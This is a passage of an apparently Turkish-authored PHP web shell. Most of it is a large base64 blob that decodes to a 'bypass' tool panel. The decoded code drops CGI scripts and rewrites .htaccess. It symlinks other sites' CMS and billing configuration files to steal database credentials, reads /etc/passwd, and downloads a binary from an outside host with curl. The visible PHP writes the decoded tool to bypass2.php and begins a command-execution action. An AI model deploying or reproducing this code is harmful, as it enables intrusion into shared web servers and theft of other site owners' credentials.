VUVXcrSndwbGNuSnZjbTFsYzNNZ1BTQW5QRU5GVGxSRlVqNDhTREkrVTI5dFpYUm9hVzVuDQpJRmRsYm5RZ1YzSnZibWM4TDBneVBqeENVajQ4VUZKRlBpY0tDaU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qDQpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TUtJeUJ0WVdsdUlHSnZaSGtnYjJZZ2RHaGxJSE5qDQpjbWx3ZEFvS2FXWWdYMTl1WVcxbFgxOGdQVDBnSjE5ZmJXRnBibDlmSnpvS0lDQWdJSEJ5YVc1MElDSkRiMjUwWlc1MExYUjVjR1U2DQpJSFJsZUhRdmFIUnRiQ0lnSUNBZ0lDQWdJQ0FqSUhSb2FYTWdhWE1nZEdobElHaGxZV1JsY2lCMGJ5QjBhR1VnYzJWeWRtVnlDaUFnDQpJQ0J3Y21sdWRDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0l5QnpieUJwY3lCMGFHbHpJR0pzDQpZVzVySUd4cGJtVUtJQ0FnSUdadmNtMGdQU0JqWjJrdVJtbGxiR1JUZEc5eVlXZGxLQ2tLSUNBZ0lHUmhkR0VnUFNCblpYUm1iM0p0DQpLRnNuWTIxa0oxMHNabTl5YlNrS0lDQWdJSFJvWldOdFpDQTlJR1JoZEdGYkoyTnRaQ2RkQ2lBZ0lDQndjbWx1ZENCMGFHVm1iM0p0DQphR1ZoWkFvZ0lDQWdjSEpwYm5RZ2RHaGxabTl5YlFvZ0lDQWdhV1lnZEdobFkyMWtPZ29nSUNBZ0lDQWdJSEJ5YVc1MElDYzhTRkkrDQpQRUpTUGp4Q1VqNG5DaUFnSUNBZ0lDQWdjSEpwYm5RZ0p6eENQa052YlcxaGJtUWdPaUFuTENCMGFHVmpiV1FzSUNjOFFsSStQRUpTDQpQaWNLSUNBZ0lDQWdJQ0J3Y21sdWRDQW5VbVZ6ZFd4MElEb2dQRUpTUGp4Q1VqNG5DaUFnSUNBZ0lDQWdkSEo1T2dvZ0lDQWdJQ0FnDQpJQ0FnSUNCamFHbHNaRjl6ZEdScGJpd2dZMmhwYkdSZmMzUmtiM1YwSUQwZ2IzTXVjRzl3Wlc0eUtIUm9aV050WkNrS0lDQWdJQ0FnDQpJQ0FnSUNBZ1kyaHBiR1JmYzNSa2FXNHVZMnh2YzJVb0tRb2dJQ0FnSUNBZ0lDQWdJQ0J5WlhOMWJIUWdQU0JqYUdsc1pGOXpkR1J2DQpkWFF1Y21WaFpDZ3BDaUFnSUNBZ0lDQWdJQ0FnSUdOb2FXeGtYM04wWkc5MWRDNWpiRzl6WlNncENpQWdJQ0FnSUNBZ0lDQWdJSEJ5DQphVzUwSUhKbGMzVnNkQzV5WlhCc1lXTmxLQ2RjYmljc0lDYzhRbEkrSnlrS0NpQWdJQ0FnSUNBZ1pYaGpaWEIwSUVWNFkyVndkR2x2DQpiaXdnWlRvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJeUJoYmlCbGNuSnZjaUJwYmlCbGVHVmpkWFJwYm1jZ2RHaGxJR052DQpiVzFoYm1RS0lDQWdJQ0FnSUNBZ0lDQWdjSEpwYm5RZ1pYSnliM0p0WlhOekNpQWdJQ0FnSUNBZ0lDQWdJR1lnUFNCVGRISnBibWRKDQpUeWdwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQnlhVzUwWDJWNFl5aG1hV3hsUFdZcENpQWdJQ0FnSUNBZ0lDQWdJR0VnUFNCbUxtZGxkSFpoDQpiSFZsS0NrdWMzQnNhWFJzYVc1bGN5Z3BDaUFnSUNBZ0lDQWdJQ0FnSUdadmNpQnNhVzVsSUdsdUlHRTZDaUFnSUNBZ0lDQWdJQ0FnDQpJQ0FnSUNCd2NtbHVkQ0JzYVc1bENnb2dJQ0FnY0hKcGJuUWdZbTlrZVdWdVpBb0tDaUlpSWdwVVQwUlBMMGxUVTFWRlV3b0tDZ3BEDQpTRUZPUjBWTVQwY0tDakEzTFRBM0xUQTBJQ0FnSUNBZ0lDQldaWEp6YVc5dUlERXVNQzR3Q2tFZ2RtVnllU0JpWVhOcFl5QnplWE4wDQpaVzBnWm05eUlHVjRaV04xZEdsdVp5QnphR1ZzYkNCamIyMXRZVzVrY3k0S1NTQnRZWGtnWlhod1lXNWtJR2wwSUdsdWRHOGdZU0J3DQpjbTl3WlhJZ0oyVnVkbWx5YjI1dFpXNTBKeUIzYVhSb0lITmxjM05wYjI0Z2NHVnljMmx6ZEdWdVkyVXVMaTRLSWlJaSc7DQoNCiRmaWxlID0gZm9wZW4oInB5dGhvbi5pem8iICwidysiKTsNCiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJHB5dGhvbnApKTsNCmZjbG9zZSgkZmlsZSk7DQogICAgY2htb2QoInB5dGhvbi5pem8iLDA3NTUpOw0KICAgZWNobyAiaHR0cDovL3B5dGhvbi9weXRob24uaXpvICI7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxMSddKSkNCnsNCiAgICBta2RpcignY29uZmlnbGVyJywgMDc1NSk7DQogICAgY2hkaXIoJ2NvbmZpZ2xlcicpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOw0KICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICANCiAgICAgICAgZndyaXRlICggJGRvc3lhICwgJG1ldGluICkgOw0KICAgICAgICBmY2xvc2UgKCRkb3N5YSk7DQokY29uZmlnc2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNJQzFKTDNWemNpOXNiMk5oYkM5aVlXNWtiV2x1RFFwd2NtbHVkQ0FpUTI5dWRHVnVkQzEwZVhCbA0KT2lCMFpYaDBMMmgwYld4Y2JseHVJanNOQ25CeWFXNTBKendoUkU5RFZGbFFSU0JvZEcxc0lGQlZRa3hKUXlBaUxTOHZWek5ETHk5RQ0KVkVRZ1dFaFVUVXdnTVM0d0lGUnlZVzV6YVhScGIyNWhiQzh2UlU0aUlDSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OVVVaTk0YUhSdA0KYkRFdlJGUkVMM2hvZEcxc01TMTBjbUZ1YzJsMGFXOXVZV3d1WkhSa0lqNE5DanhvZEcxc0lIaHRiRzV6UFNKb2RIUndPaTh2ZDNkMw0KTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0TkNqeG9aV0ZrUGcwS1BHMWxkR0VnYUhSMGNDMWxjWFZwZGowaVEyOXVkR1Z1ZEMxTQ0KWVc1bmRXRm5aU0lnWTI5dWRHVnVkRDBpWlc0dGRYTWlJQzgrRFFvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNQ0KY0dVaUlHTnZiblJsYm5ROUluUmxlSFF2YUhSdGJEc2dZMmhoY25ObGREMTFkR1l0T0NJZ0x6NE5DangwYVhSc1pUNWJmbDBnUTNsaQ0KTTNJdFJGb2dRMjl1Wm1sbklDMGdXMzVkSUR3dmRHbDBiR1UrRFFvOGMzUjViR1VnZEhsd1pUMGlkR1Y0ZEM5amMzTWlQZzBLTG01bA0KZDFOMGVXeGxNU0I3RFFvZ1ptOXVkQzFtWVcxcGJIazZJRlJoYUc5dFlUc05DaUJtYjI1MExYTnBlbVU2SUhndGMyMWhiR3c3RFFvZw0KWm05dWRDMTNaV2xuYUhRNklHSnZiR1E3RFFvZ1kyOXNiM0k2SUNNd01FWkdSa1k3RFFvZ0lIUmxlSFF0WVd4cFoyNDZJR05sYm5SbA0KY2pzTkNuME5Dand2YzNSNWJHVStEUW84TDJobFlXUStEUW9uT3cwS2MzVmlJR3hwYkhzTkNpQWdJQ0FvSkhWelpYSXBJRDBnUUY4Nw0KRFFva2JYTnlJRDBnY1hoN2NIZGtmVHNOQ2lScmIyeGhQU1J0YzNJdUlpOGlMaVIxYzJWeU93MEtKR3R2YkdFOWZuTXZYRzR2TDJjNw0KSUEwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wybHVZMngxWkdWekwyTnZibVpwWjNWeQ0KWlM1d2FIQW5MQ1JyYjJ4aExpY3RjMmh2Y0M1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKcw0KYVdOZmFIUnRiQzloYldWdFltVnlMMk52Ym1acFp5NXBibU11Y0dod0p5d2thMjlzWVM0bkxXRnRaVzFpWlhJdWRIaDBKeWs3RFFweg0KZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WTI5dVptbG5MbWx1WXk1d2FIQW5MQ1JyYjJ4aA0KTGljdFlXMWxiV0psY2pJdWRIaDBKeWs3RFFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dg0KYldWdFltVnljeTlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTF0WlcxaVpYSnpMblI0ZENjcE93MEtjM2x0YkdsdQ0KYXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3lMblI0ZENjcA0KT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyWnZjblZ0TDJsdVkyeDFaR1Z6TDJOdg0KYm1acFp5NXdhSEFuTENScmIyeGhMaWN0Wm05eWRXMHVkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdg0KY0hWaWJHbGpYMmgwYld3dllXUnRhVzR2WTI5dVppNXdhSEFuTENScmIyeGhMaWMxTG5SNGRDY3BPdzBLYzNsdGJHbHVheWduTDJodg0KYldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMkZrYldsdUwyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpYzBMblI0ZENjcA0KT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZHdMV052Ym1acFp5NXdhSEFuTENScg0KYjJ4aExpY3RkM0F4TXk1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5aQ0KYkc5bkwzZHdMV052Ym1acFp5NXdhSEFuTENScmIyeGhMaWN0ZDNBdFlteHZaeTUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbA0KTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjVtWDJkc2IySmhiQzV3YUhBbkxDUnJiMnhoTGljMkxuUjRkQ2NwT3cwSw0KYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJsdVkyeDFaR1V2WkdJdWNHaHdKeXdrYTI5cw0KWVM0bk55NTBlSFFuS1RzTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjV1WldOMA0KTG5Cb2NDY3NKR3R2YkdFdUp6Z3VkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMA0KYld3dmJXdGZZMjl1Wmk1d2FIQW5MQ1JyYjJ4aExpYzVMblI0ZENjcE93MEtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bg0KTDNCMVlteHBZMTlvZEcxc0wybHVZMngxWkdVdlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6RXlMblI0ZENjcE93MEtjM2x0YkdsdQ0KYXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wycHZiMjFzWVM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njcw0KSkd0dmJHRXVKeTFxYjI5dGJHRXVkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMA0KYld3dmRtSXZhVzVqYkhWa1pYTXZZMjl1Wm1sbkxuQm9jQ2NzSkd0dmJHRXVKeTEyWWk1MGVIUW5LVHNOQ25ONWJXeHBibXNvSnk5bw0KYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlwYm1Oc2RXUmxjeTlqYjI1bWFXY3VjR2h3Snl3a2EyOXNZUzRuTFdsdQ0KWTJ4MVpHVnpMWFppTG5SNGRDY3BPdzBLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNkbw0KYlM5amIyNW1hV2QxY21GMGFXOXVMbkJvY0Njc0pHdHZiR0V1SnkxM2FHMHhOUzUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbA0KTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOTNhRzFqTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFhkbw0KYldNeE5pNTBlSFFuS1RzTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOTNhRzFqY3k5ag0KYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTEzYUcxamN5NTBlSFFuS1RzTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdQ0KSkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5emRYQndiM0owTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFhOMQ0KY0hCdmNuUXVkSGgwSnlrN0RRcHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMjl1Wm1sbg0KZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljeGQyaHRZM011ZEhoMEp5azdEUXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeQ0KTGljdmNIVmliR2xqWDJoMGJXd3ZjM1ZpYldsMGRHbGphMlYwTG5Cb2NDY3NKR3R2YkdFdUp5MTNhRzFqY3pJdWRIaDBKeWs3RFFweg0KZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WTJ4cFpXNTBjeTlqYjI1bWFXZDFjbUYwYVc5dQ0KTG5Cb2NDY3NKR3R2YkdFdUp5MWpiR2xsYm5SekxuUjRkQ2NwT3cwS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMQ0KWW14cFkxOW9kRzFzTDJOc2FXVnVkQzlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTFqYkdsbGJuUXVkSGgwSnlrNw0KRFFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyeHBaVzUwWlhNdlkyOXVabWxuZFhKaA0KZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WTJ4cFpXNTBjeTUwZUhRbktUc05Dbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdQ0KSnk5d2RXSnNhV05mYUhSdGJDOWlhV3hzYVc1bkwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxXSnBiR3hwYm1jdQ0KZEhoMEp5azdJQTBLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDIxaGJtRm5aUzlqYjI1bQ0KYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWlhV3hzYVc1bkxuUjRkQ2NwT3lBTkNuTjViV3hwYm1zb0p5OW9iMjFsTHljdQ0KSkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGVTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWlhV3hzYVc1bg0KTG5SNGRDY3BPeUFOQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGVYTm9iM0F2WTI5dQ0KWm1sbmRYSmhkR2x2Ymk1d2FIQW5MQ1JyYjJ4aExpY3RZbWxzYkdsdVp5NTBlSFFuS1RzZ0RRcDlEUXBwWmlBb0pFVk9WbnNuVWtWUg0KVlVWVFZGOU5SVlJJVDBRbmZTQmxjU0FuVUU5VFZDY3BJSHNOQ2lBZ2NtVmhaQ2hUVkVSSlRpd2dKR0oxWm1abGNpd2dKRVZPVm5zbg0KUTA5T1ZFVk9WRjlNUlU1SFZFZ25mU2s3RFFwOUlHVnNjMlVnZXcwS0lDQWtZblZtWm1WeUlEMGdKRVZPVm5zblVWVkZVbGxmVTFSUw0KU1U1SEozMDdEUXA5RFFwQWNHRnBjbk1nUFNCemNHeHBkQ2d2Smk4c0lDUmlkV1ptWlhJcE93MEtabTl5WldGamFDQWtjR0ZwY2lBbw0KUUhCaGFYSnpLU0I3RFFvZ0lDZ2tibUZ0WlN3Z0pIWmhiSFZsS1NBOUlITndiR2wwS0M4OUx5d2dKSEJoYVhJcE93MEtJQ0FrYm1GdA0KWlNBOWZpQjBjaThyTHlBdk93MEtJQ0FrYm1GdFpTQTlmaUJ6THlVb1cyRXRaa0V0UmpBdE9WMWJZUzFtUVMxR01DMDVYU2t2Y0dGag0KYXlnaVF5SXNJR2hsZUNna01Ta3BMMlZuT3cwS0lDQWtkbUZzZFdVZ1BYNGdkSEl2S3k4Z0x6c05DaUFnSkhaaGJIVmxJRDErSUhNdg0KSlNoYllTMW1RUzFHTUMwNVhWdGhMV1pCTFVZd0xUbGRLUzl3WVdOcktDSkRJaXdnYUdWNEtDUXhLU2t2WldjN0RRb2dJQ1JHVDFKTg0KZXlSdVlXMWxmU0E5SUNSMllXeDFaVHNOQ24wTkNtbG1JQ2drUms5U1RYdHdZWE56ZlNCbGNTQWlJaWw3RFFwd2NtbHVkQ0FuRFFvOA0KWW05a2VTQmpiR0Z6Y3owaWJtVjNVM1I1YkdVeElpQmlaMk52Ykc5eVBTSWpNREF3TURBd0lqNE5Danh3UGtONVlqTnlMV1I2SUVOdg0KYm1acFp5QkdkV05ySUZOamNtbHdkRHd2Y0Q0TkNqeHdQanhtYjI1MElHTnZiRzl5UFNJalF6QkRNRU13SWo1YlBDOW1iMjUwUGlCRA0KYjJSbFpDQkNlU0JEZVdJemNpMUVXaUE4Wm05dWRDQmpiMnh2Y2owaUkwTXdRekJETUNJK2ZEd3ZabTl1ZEQ0Z0RRcmVZU0JBVHk0Zw0KWnNrY1pTOGczbUU4YzNCaGJpQnBaRDBpY21WemRXeDBYMkp2ZUNJZ1kyeGhjM005SW5Ob2IzSjBYM1JsZUhRaUlHeGhibWM5SW1WdQ0KSWo0OGMzQmhiaUJ6ZEhsc1pTQjBhWFJzWlQ0TkNqeG1iMjUwSUdOdmJHOXlQU0lqUXpCRE1FTXdJajU4UEM5bWIyNTBQand2YzNCaA0KYmo0OEwzTndZVzQrSUR4aElHaHlaV1k5SW1oMGRIQTZMeTkzZDNjdWQzZDNMbk5sWXpSbGRtVnlMbU52YlNJK0RRbzhjM0JoYmlCeg0KZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQnViMjVsSWo0OFptOXVkQ0JqYjJ4dmNqMGlJekF3UmtZd01DSStkM2QzTG5ObA0KWXpSbGRtVnlMbU52YlR3dlptOXVkRDQ4TDNOd1lXNCtQQzloUGlBTkNqeG1iMjUwSUdOdmJHOXlQU0lqUXpCRE1FTXdJajVkUEM5bQ0KYjI1MFBqd3ZjRDROQ2p4bWIzSnRJRzFsZEdodlpEMGljRzl6ZENJK0RRbzhkR1Y0ZEdGeVpXRWdibUZ0WlQwaWNHRnpjeUlnYzNSNQ0KYkdVOUltSnZjbVJsY2pveGNIZ2daRzkwZEdWa0lDTXdNRVpHUmtZN0lIZHBaSFJvT2lBMU5ETndlRHNnYUdWcFoyaDBPaUEwTWpCdw0KZURzZ1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvak1FTXdRekJET3lCbWIyNTBMV1poYldsc2VUcFVZV2h2YldFN0lHWnZiblF0YzJsNg0KWlRvNGNIUTdJR052Ykc5eU9pTXdNRVpHUmtZaUlDQStQQzkwWlhoMFlYSmxZVDQ4WW5JZ0x6NE5DaVp1WW5Od096eHdQZzBLUEdsdQ0KY0hWMElHNWhiV1U5SW5SaGNpSWdkSGx3WlQwaWRHVjRkQ0lnYzNSNWJHVTlJbUp2Y21SbGNqb3hjSGdnWkc5MGRHVmtJQ013TUVaRw0KUmtZN0lIZHBaSFJvT2lBeU1USndlRHNnWW1GamEyZHliM1Z1WkMxamIyeHZjam9qTUVNd1F6QkRPeUJtYjI1MExXWmhiV2xzZVRwVQ0KWVdodmJXRTdJR1p2Ym5RdGMybDZaVG80Y0hRN0lHTnZiRzl5T2lNd01FWkdSa1k3SUNJZ0lDOCtQR0p5SUM4K0RRb21ibUp6Y0RzOA0KTDNBK0RRbzhjRDROQ2p4cGJuQjFkQ0J1WVcxbFBTSlRkV0p0YVhReElpQjBlWEJsUFNKemRXSnRhWFFpSUhaaGJIVmxQU0pIWlhRZw0KUTI5dVptbG5JaUJ6ZEhsc1pUMGlZbTl5WkdWeU9qRndlQ0JrYjNSMFpXUWdJekF3UmtaR1Jqc2dkMmxrZEdnNklEazVPeUJtYjI1MA0KTFdaaGJXbHNlVHBVWVdodmJXRTdJR1p2Ym5RdGMybDZaVG94TUhCME95QmpiMnh2Y2pvak1EQkdSa1pHT3lCMFpYaDBMWFJ5WVc1eg0KWm05eWJUcDFjSEJsY21OaGMyVTdJR2hsYVdkb2REb3lNenNnWW1GamEyZHliM1Z1WkMxamIyeHZjam9qTUVNd1F6QkRJaUF2UGp3dg0KY0Q0TkNqd3ZabTl5YlQ0bk93MEtmV1ZzYzJWN0RRcEFiR2x1WlhNZ1BUd2tSazlTVFh0d1lYTnpmVDQ3RFFva2VTQTlJRUJzYVc1bA0KY3pzTkNtOXdaVzRnS0UxWlJrbE1SU3dnSWo1MFlYSXVkRzF3SWlrN0RRcHdjbWx1ZENCTldVWkpURVVnSW5SaGNpQXRZM3BtSUNJdQ0KSkVaUFVrMTdkR0Z5ZlM0aUxuUmhjaUFpT3cwS1ptOXlJQ2drYTJFOU1Ec2thMkU4SkhrN0pHdGhLeXNwZXcwS2QyaHBiR1VvUUd4cA0KYm1Weld5UnJZVjBnSUQxK0lHMHZLQzRxUHlrNmVEb3ZaeWw3RFFvbWJHbHNLQ1F4S1RzTkNuQnlhVzUwSUUxWlJrbE1SU0FrTVM0aQ0KTG5SNGRDQWlPdzBLWm05eUtDUnJaRDB4T3lSclpEd3hPRHNrYTJRckt5bDdEUXB3Y21sdWRDQk5XVVpKVEVVZ0pERXVKR3RrTGlJdQ0KZEhoMElDSTdEUXA5RFFwOURRb2dmUTBLY0hKcGJuUW5QR0p2WkhrZ1kyeGhjM005SW01bGQxTjBlV3hsTVNJZ1ltZGpiMnh2Y2owaQ0KSXpBd01EQXdNQ0krRFFvOGNENUViMjVsSUNFaFBDOXdQZzBLUEhBK0ptNWljM0E3UEM5d1BpYzdEUXBwWmlna1JrOVNUWHQwWVhKOQ0KSUc1bElDSWlLWHNOQ205d1pXNG9TVTVHVHl3Z0luUmhjaTUwYlhBaUtUc05Da0JzYVc1bGN5QTlQRWxPUms4K0lEc05DbU5zYjNObA0KS0VsT1JrOHBPdzBLYzNsemRHVnRLRUJzYVc1bGN5azdEUXB3Y21sdWRDYzhjRDQ4WVNCb2NtVm1QU0luTGlSR1QxSk5lM1JoY24wdQ0KSnk1MFlYSWlQanhtYjI1MElHTnZiRzl5UFNJak1EQkdSakF3SWo0TkNqeHpjR0Z1SUhOMGVXeGxQU0owWlhoMExXUmxZMjl5WVhScA0KYjI0NklHNXZibVVpUGtOc2FXTnJJRWhsY21VZ1ZHOGdSRzkzYm14dllXUWdWR0Z5SUVacGJHVThMM053WVc0K1BDOW1iMjUwUGp3dg0KWVQ0OEwzQStKenNOQ24wTkNuME5DaUJ3Y21sdWRDSU5Dand2WW05a2VUNE5Dand2YUhSdGJENGlPdz09JzsNCg0KJGZpbGUgPSBmb3BlbigiY29uZmlnLml6byIgLCJ3KyIpOw0KJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsNCmZjbG9zZSgkZmlsZSk7DQogICAgY2htb2QoImNvbmZpZy5pem8iLDA3NTUpOw0KICAgZWNobyAiaHR0cDovL2NvbmZpZ2xlci9jb25maWcuaXpvICI7DQp9DQppZiAoaXNzZXQoJF9QT1NUWydTdWJtaXQxNSddKSkNCnsNCiAgICBta2Rpcignb2t1JywgMDc1NSk7DQogICAgY2hkaXIoJ29rdScpOw0KICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsNCiAgICAgICAgJGRvc3lhX2FkaSA9ICIka29rZG9zeWEiOw0KICAgICAgICAkZG9zeWEgPSBmb3BlbiAoJGRvc3lhX2FkaSAsICd3Jykgb3IgZGllICgiRG9zeWEgYcOnxLFsYW1hZMSxISIpOw0KICAgICAgICAkbWV0aW4gPSAiT3B0aW9ucyBhbGwNCkRpcmVjdG9yeUluZGV4IDEudHh0IjsgICAgDQogICAgICAgIGZ3cml0ZSAoICRkb3N5YSAsICRtZXRpbiApIDsNCiAgICAgICAgZmNsb3NlICgkZG9zeWEpOw0KQGV4ZWMoJ2xuIC1zIC9ldGMvcGFzc3dkIDEudHh0Jyk7DQpAZXhlYygnY3VybCBodHRwOi8vdHVya2JsYWNraGF0cy5jb20vcHJpdi9sbi56aXAgLW8gbG4uemlwJyk7DQpAZXhlYygndW56aXAgbG4uemlwJyk7DQpAZXhlYygnY2htb2QgNzU1IGxuJyk7DQpAZXhlYygnLi9sbiAtcyAvZXRjL3Bhc3N3ZCAxLnR4dCcpOw0KICAgZWNobyAiaHR0cDovL29rdS8xLnR4dCAiOw0KfQ0KPz4NCiAgPHRyPg0KICAgIDx0ZD48dGFibGUgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTczJz4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoIGNsYXNzPSd0ZCcgc3R5bGU9J2JvcmRlci1ib3R0b20td2lkdGg6dGhpbjtib3JkZXItdG9wLXdpZHRoOnRoaW4nPjxkaXYgYWxpZ249J3JpZ2h0Jz48c3BhbiBjbGFzcz0nc3R5bGUxJz5Ub29scyA6PC9zcGFuPjwvZGl2PjwvdGg+DQogICAgICAgIDx0ZCBjbGFzcz0ndGQnIHN0eWxlPSdib3JkZXItYm90dG9tLXdpZHRoOnRoaW47Ym9yZGVyLXRvcC13aWR0aDp0aGluJz48Zm9ybSBuYW1lPSdGMScgbWV0aG9kPSdwb3N0Jz4NCiAgICAgICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPg0KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQyJyAgdmFsdWU9J2xuIC1zIGJ5cGFzc2VkIHTDvG0gZGl6aW5sZXInPg0KICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxMScgdmFsdWU9J0NvbmZpZyBCeXBhc3Nlcic+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEyJyB2YWx1ZT0nUGVybCBsbiAtcyBTeW1saW5rIEJ5cGFzc2VyJz4NCgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTMnIHZhbHVlPSdDZ2l0ZWxuZXQgYnlwYXNzcic+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE0JyB2YWx1ZT0nUHl0aG9uIHNoZWxsICBCeXBhc3Nlcic+DQoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE1JyB2YWx1ZT0nRGlyZWN0b3J5IEJ5cGFzc2VyKGV4YW1wbGUgL2V0Yy9wYXNzd2QpJz4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Zvcm0+PC90ZD4NCiAgICAgIDwvdHI+DQogICA8dHI+DQoNCjwvYm9keT4NCjwvaHRtbD4=';
        $file       = fopen("bypass2.php", "w+");
        $write      = fwrite($file, base64_decode($perltoolss));
        fclose($file);
        echo "<iframe src=bypass2.php width=100% height=720px frameborder=0></iframe> ";
 }elseif ($action == 'newcommand') {
    $file       = fopen($dir . "command.php", "w+");
